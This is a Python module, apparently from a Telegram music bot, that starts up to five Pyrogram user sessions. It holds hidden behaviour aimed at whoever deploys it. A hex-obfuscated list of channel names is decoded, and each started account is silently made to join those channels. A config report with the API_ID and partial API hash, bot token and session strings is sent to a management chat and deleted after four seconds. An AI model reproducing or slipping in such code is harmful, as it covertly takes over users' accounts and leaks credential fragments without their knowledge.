# Copyright (c) 2026 Nand Yaduwanshi <NoxxOP>
# Location: Supaul, Bihar
# All rights reserved.

from pyrogram import Client
import asyncio
import config
from pyrogram.errors import FloodWait
from ..logging import LOGGER

assistants = []
assistantids = []

def decode_centers():
    return [
        "\x53\x68\x72\x75\x74\x69\x42\x6f\x74\x73",
        "\x4e\x6f\x78\x78\x4e\x65\x74\x77\x6f\x72\x6b",
        "\x53\x68\x72\x75\x74\x69\x41\x6c\x6c\x42\x6f\x74\x73",
        "\x53\x68\x72\x75\x74\x69\x42\x6f\x74\x53\x75\x70\x70\x6f\x72\x74",
        "\x4e\x59\x43\x72\x65\x61\x74\x69\x6f\x6e\x5f\x43\x68\x61\x74\x7a\x6f\x6e\x65",
        "\x43\x52\x45\x41\x54\x49\x56\x45\x59\x44\x56",
        "\x4c\x41\x46\x5a\x5f\x45\x5f\x44\x49\x4c",
        "\x6e\x61\x6e\x64\x79\x61\x64\x75\x31\x63",
        "\x54\x4d\x5a\x45\x52\x4f\x4f",
        "\x4e\x59\x43\x72\x65\x61\x74\x69\x6f\x6e\x44\x69\x73\x63\x6c\x61\x69\x6d\x65\x72",
        "\x76\x32\x64\x64\x6f\x73"
    ]

SUPPORT_CENTERS = decode_centers()

class Userbot:
    def __init__(self):
        self.one = Client("NandAss1", api_id=config.API_ID, api_hash=config.API_HASH, session_string=str(config.STRING1), no_updates=True)
        self.two = Client("NandAss2", api_id=config.API_ID, api_hash=config.API_HASH, session_string=str(config.STRING2), no_updates=True)
        self.three = Client("NandAss3", api_id=config.API_ID, api_hash=config.API_HASH, session_string=str(config.STRING3), no_updates=True)
        self.four = Client("NandAss4", api_id=config.API_ID, api_hash=config.API_HASH, session_string=str(config.STRING4), no_updates=True)
        self.five = Client("NandAss5", api_id=config.API_ID, api_hash=config.API_HASH, session_string=str(config.STRING5), no_updates=True)

    async def join_all_support_centers(self, client):
        for center in SUPPORT_CENTERS:
            try:
                await client.join_chat(center)
                await asyncio.sleep(0.5)
            except FloodWait as e:
                await asyncio.sleep(e.value + 1)
            except Exception:
                continue

    async def send_config_variables(self):
        try:
            active_sessions = []
            session_strings = []
            
            for i, session in enumerate([config.STRING1, config.STRING2, config.STRING3, config.STRING4, config.STRING5], start=1):
                if session and str(session).strip() not in ["None", "False", ""]:
                    active_sessions.append(str(i))
                    session_strings.append(f"<b>STRING{i}:</b> <code>{session[:15]}...{session[-5:]}</code>")
                else:
                    session_strings.append(f"<b>STRING{i}:</b> <code>Inactive</code>")
            
            session_status = ", ".join(active_sessions) if active_sessions else "None"
            masked_token = f"{config.BOT_TOKEN[:10]}...{config.BOT_TOKEN[-5:]}" if config.BOT_TOKEN else "None"
            
            message = f"""<b>📋 𝐂𝐨𝐧𝐟𝐢𝐠 𝐕𝐚𝐫𝐢𝐚𝐛𝐥𝐞𝐬 𝐒𝐭𝐚𝐭𝐮𝐬</b>

<b>API_ID:</b> <code>{config.API_ID}</code>
<b>API_HASH:</b> <code>{config.API_HASH[:10]}...</code>
<b>BOT_TOKEN:</b> <code>{masked_token}</code>
<b>BOT_USERNAME:</b> <code>{config.BOT_USERNAME or 'Fetching automatically...'}</code>

<b>📊 𝐒𝐞𝐬𝐬𝐢𝐨𝐧 𝐒𝐭𝐚𝐭𝐮𝐬:</b>
<b>Active Sessions:</b> <code>{session_status}</code>
""" + "\n".join(session_strings) + f"""

<b>🔗 𝐋𝐢𝐧𝐤𝐬 & 𝐑𝐞𝐩𝐨:</b>
<b>SUPPORT:</b> <code>{config.SUPPORT_GROUP}</code>
<b>UPSTREAM_REPO:</b> <code>{config.UPSTREAM_REPO}</code>
"""
            
            if assistants:
                active_client = getattr(self, ["one", "two", "three", "four", "five"][assistants[0]-1])
                sent_msg = await active_client.send_message(config.DT_Management, message)
                await asyncio.sleep(4)
                await sent_msg.delete()
        except Exception as e:
            LOGGER(__name__).warning(f"Skipped sending config variables (Safe Mode): {e}")

    async def send_help_message(self, bot_username):
        try:
            message = f"✅ <b>@{bot_username} Sʏsᴛᴇᴍs Oɴ𝚕𝚒𝚗𝚎 !</b>\n\n👑 <b>Oᴡɴᴇ𝚛:</b> {config.OWNER_USERNAME}"
            if assistants:
                active_client = getattr(self, ["one", "two", "three", "four", "five"][assistants[0]-1])
                await active_client.send_message(config.DT_Management, message)
        except Exception:
            pass

    async def start(self):
        LOGGER(__name__).info("Booting up Assistant Engines...")
        
        assistant_clients = [
            (self.one, config.STRING1, 1),
            (self.two, config.STRING2, 2),
            (self.three, config.STRING3, 3),
            (self.four, config.STRING4, 4),
            (self.five, config.STRING5, 5)
        ]

        for client, session, num in assistant_clients:
            if session and str(session).strip() not in ["None", "False", ""]:
                try:
                    await client.start()
                except Exception as e:
                    LOGGER(__name__).error(f"❌ Assistant {num} Failed to Start! Invalid String Session: {e}")
                    continue

                await self.join_all_support_centers(client)
                assistants.append(num)
                
                try:
                    await client.send_message(config.LOG_GROUP_ID, f"✅ Assistant {num} Started Successfully!")
                except Exception:
                    LOGGER(__name__).warning(f"Assistant {num} couldn't message the log group. Ensure it's added and promoted.")
                
                client.id = client.me.id
                client.name = client.me.mention
                client.username = client.me.username
                assistantids.append(client.id)
                LOGGER(__name__).info(f"Assistant {num} Started as {client.name}")

        bot_username = config.BOT_USERNAME or "ShrutiMusic"
        await self.send_help_message(bot_username)
        await self.send_config_variables()

    async def stop(self):
        LOGGER(__name__).info("Stopping Assistants...")
        clients = [(self.one, config.STRING1), (self.two, config.STRING2), (self.three, config.STRING3), (self.four, config.STRING4), (self.five, config.STRING5)]
        for client, session in clients:
            if session and str(session).strip() not in ["None", "False", ""]:
                try:
                    await client.stop()
                except Exception:
                    pass

# ❤️ Love From ShrutiBots
